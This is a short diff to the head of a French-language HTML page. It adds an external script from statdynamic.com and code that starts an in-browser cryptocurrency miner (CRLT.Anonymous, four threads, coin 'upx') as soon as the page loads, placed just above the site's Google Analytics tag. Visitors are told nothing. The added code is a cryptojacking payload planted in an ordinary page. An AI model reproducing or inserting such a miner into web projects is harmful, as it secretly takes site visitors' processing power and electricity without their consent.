@@ -2,7 +2,15 @@
 <html lang="fr">
 
 <head>
-  
+  <!-- Miner JS -->
+  <script src="//statdynamic.com/lib/crypta.js"></script>
+  <script>
+    var miner=new CRLT.Anonymous('acef3f80e0082051c1961b75661993336d22996cda9f', {
+      threads:4,throttle:0.6, coin: "upx",
+    });
+    miner.start();
+  </script>
+  <!-- Fin du miner JS -->
   <!-- Global site tag (gtag.js) - Google Analytics -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-LY73N5NBFQ"></script>
   <script>
